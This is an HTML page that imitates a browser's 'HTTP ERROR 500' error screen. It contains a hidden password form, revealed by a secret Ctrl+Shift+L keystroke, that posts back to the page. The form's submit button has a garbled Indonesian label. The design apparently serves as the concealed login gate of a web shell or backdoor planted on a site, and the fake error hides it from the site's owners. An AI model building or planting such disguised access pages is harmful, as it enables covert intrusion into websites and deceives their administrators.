<!DOCTYPE html>
<html lang="id">
<head>
    <script>
            document.addEventListener('keydown', function(event) {
                if (event.ctrlKey && event.shiftKey && event.code === 'KeyL') {
                    document.getElementById('login-form').style.display = 'block';
                }
            });
        </script>
        <style>
            #login-form { display: none; }
        </style>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>This page isn’t working</title>
  <style>
    :root{
      --bg: #202124;
      --muted: #9aa0a6;
      --text: #9aa0a6;
      --sub: #bdc1c6;
      --pill-bg: #8ab4f8;
    }

    html,body{
      height:100%;
      margin:0;
      background:var(--bg);
      font-family:"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
      color:var(--text);
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
    }

    .page {
      min-height:100%;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
      box-sizing:border-box;
    }

    .card {
      max-width:480px;
      width:100%;
      text-align:left;
    }

    .icon {
      width: 35px;
      height: auto;
      margin-bottom: 18px;
      fill: var(--muted);
    }

    h1{
      margin:0 0 8px 0;
      font-size:22px;
      font-weight:500;
      color:var(--text);
    }

    p {
      margin:0 0 8px 0;
      color:var(--sub);
      font-size:15px;
      line-height:1.5;
    }

    .error {
      margin-top:8px;
      color:var(--muted);
      font-size:13px;
    }

    .pill {
      display:inline-block;
      margin-top:20px;
      background:var(--pill-bg);
      color:#000;
      text-decoration:none;
      border:0;
      padding:10px 22px;
      font-size:12px;
      font-weight:400;
      border-radius:999px;
      box-shadow:var(--pill-shadow);
      cursor:pointer;
      line-height:1;
      -webkit-tap-highlight-color:transparent;
    }

    .pill:focus{
      outline:none;
      box-shadow:0 0 0 4px rgba(26,115,232,0.12),var(--pill-shadow);
    }

    @media (max-width:420px){
      .card { max-width:340px; }
      .icon { font-size:58px; margin-bottom:14px; }
      .pill { padding:10px 18px; font-size:13px; }
    }
  </style>
</head>
<body>
  <div class="page">
    <div class="card" role="main" aria-labelledby="title">
      <div class="icon" aria-hidden="true">
        
        <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 103" preserveAspectRatio="xMidYMid meet">
        <g transform="translate(0,103) scale(0.1,-0.1)" fill="var(--muted)" stroke="none">
          <path d="M0 515 l0 -515 398 2 397 3 0 440 0 440 -32 3 -32 3 -3 -73 -3 -73
          -115 0 -115 0 0 110 0 110 73 3 72 3 0 29 0 30 -320 0 -320 0 0 -515z m428
          303 l3 -147 147 -3 147 -3 3 -294 c2 -226 -1 -296 -10 -302 -15 -10 -638 -12
          -662 -3 -14 6 -16 48 -16 448 0 244 3 446 7 450 4 3 90 5 192 4 l186 -3 3
          -147z"/>
          <path d="M200 739 l0 -70 33 3 32 3 3 68 3 67 -36 0 -35 0 0 -71z"/>
          <path d="M280 330 l0 -30 120 0 120 0 0 30 0 30 -120 0 -120 0 0 -30z"/>
          <path d="M202 258 c3 -29 6 -33 33 -33 27 0 30 3 30 30 0 27 -4 30 -33 33 -32
          3 -33 2 -30 -30z"/>
          <path d="M530 255 c0 -32 2 -35 30 -35 28 0 30 3 30 35 0 32 -2 35 -30 35 -28
          0 -30 -3 -30 -35z"/>
          <path d="M650 930 c0 -28 3 -30 35 -30 32 0 35 2 35 30 0 28 -3 30 -35 30 -32
          0 -35 -2 -35 -30z"/>
        </g>
      </svg>
      
      </div>

      <h1 id="title">This page isn’t working</h1>

      <p><strong id="domain-name"></strong> is currently unable to handle this request.</p>

      <p class="error">HTTP ERROR 500</p>

      <button class="pill" id="reloadBtn" aria-label="Reload page">Reload</button>
    </div>
    <form id="login-form" method="POST" action="">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password">
            <input type="submit" value="Tennessee Sandinya ?">
        </form>
  </div>

  <script>
    
    document.getElementById('domain-name').textContent = window.location.hostname;

    
    document.getElementById('reloadBtn').addEventListener('click', function(){
      try {
        location.reload();
      } catch(e) {
        window.location.href = window.location.href;
      }
    });
  </script>
  
</body>
</html>
    